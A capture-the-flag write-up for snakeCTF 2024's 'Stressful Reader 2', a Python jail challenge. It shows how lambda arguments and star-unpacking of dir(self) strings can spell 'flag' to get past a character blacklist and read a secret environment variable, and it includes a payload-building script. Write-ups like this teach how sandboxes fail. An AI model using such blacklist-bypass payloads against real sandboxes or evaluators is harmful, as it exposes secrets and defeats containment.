# Stressful Reader 2 [_snakeCTF 2024 Quals_]

**Category**: Misc

## Description

I really, really, really want to read the $FLAG, but why is it so stressful?

## Solution

This challenge builds upon ["Stressful reader"](https://github.com/MadrHacks/snakeCTF2023-Writeups/blob/master/misc/stressful-reader/writeup.md) so with a bit of searching on the web a good starting point for the solution can be found.

As in "Stressful reader", the set of characters and keywords that can be used is extremely limited, and `lambda` functions are the way to go to bypass the blacklist. The difference with the previous version of the challenge is that object variables that allow to write `FLAG` easily are not available any more, so a different way to solve the challenge has to be found.

It can be seen that in the `get_var` function, the parameter `varname` is capitalised before being given to `os.getenv`:

```python
def get_var(self, varname):
    varname = varname.upper()
    print(os.getenv(varname))
```

It means that all it takes is finding a way to write "flag"! All the stuff that is needed can be found in `dir(self)`:

```python
>>> print(dir(self))
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__',
 '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__',
 '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__',
 '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__',
 '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'get_var',
 'run_code']
```

`lambda` functions and list expansions with `*` can be used to access the single letters of the strings in `dir(self)` to compose the word "flag", because:

```python
>>> (lambda s, n, a, k, e: s)(*"snake")
's'
```

All the letters that are needed can be found in `'__format__', '__class__','__ge__'`, so with a little script it's possible to generate the list of parameters that enable the decomposition of these strings and access the single characters:

```python
# Param names to access all the strings in dir(self)
params = ['a' * i for i in range(1,30)]

## there are 29 items in dir(self)

#  __format__ for 'f' -> 6th element in dir(self)
# __class__ for 'la' ->  0th element
# __ge__ for 'g' -> 7th element

def param_letters(s):
    return ['b'*i for i in range(1, len(s)+1)]

f = param_letters('__format__')
c = param_letters('__class__')
g = param_letters('__ge__')

payload = (f"self.get_var((lambda {','.join(params)} : " +
    f"(lambda {','.join(f)}: {f[2]})(*{params[6]}) +" +
    f"(lambda {','.join(c)}: {c[3]} + {c[4]})(*{params[0]}) +" +
    f"(lambda {','.join(g)}: {g[2]})(*{params[7]})" +
    ")(*dir(self)))"
)
```
